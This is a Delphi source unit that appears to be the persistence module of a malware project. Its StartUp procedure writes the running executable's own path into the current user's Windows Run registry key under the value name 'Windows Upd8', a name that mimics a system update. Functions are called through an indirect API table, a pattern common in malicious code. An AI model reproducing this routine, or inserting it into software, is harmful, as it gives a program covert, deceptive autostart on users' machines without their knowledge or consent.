unit untStartUp;

interface

uses
  untUtils,
  Windows;

function AddRegKey(pAPI:PAPIRec; KEY:HKEY; pPath, pKeyName, pValue:PWideChar):Boolean;
procedure StartUp(pAPI:PAPIRec);

implementation
{
==============================================================================
STARTUP FUNCTIONS
==============================================================================
}

procedure StartUp(pAPI:PAPIRec);
var
  strCurrentPath:array[0..MAX_PATH] of WideChar;
  pRegValue:PWideChar;
  lRegValLen:Integer;
begin
  pAPI.xGetModuleFileNameW(0, strCurrentPath, MAX_PATH);
  lRegValLen := pAPI.xlstrlenW(strCurrentPath) + 2;
  pRegValue := pAPI.xAllocMem(pAPI, lRegValLen);
  if (pRegValue <> nil) then
  begin
    pAPI.xwsprintfW(pRegValue, '"%s"', strCurrentPath);
    pAPI.xMessageBoxW(0, pRegValue, nil, 0);
    AddRegKey(pAPI, HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run\', 'Windows Upd8', pRegValue);
    //pAPI.xFreeMem(pRegValue);
  end;
end;

function AddRegKey(pAPI:PAPIRec; KEY:HKEY; pPath, pKeyName, pValue:PWideChar):Boolean;
var
  phkResult: HKEY;
begin
  Result := False;
  if RegOpenKeyExW(KEY, pPath, 0, KEY_SET_VALUE, phkResult) = ERROR_SUCCESS then
  begin
    Result := (RegSetValueExW(phkResult, pKeyName, 0, REG_SZ, pValue, (lstrlenW(pValue) + 1) * 2) = ERROR_SUCCESS);
    RegCloseKey(phkResult);
  end;
end;

{
==============================================================================
STARTUP FUNCTIONS_END
==============================================================================
}
end.
 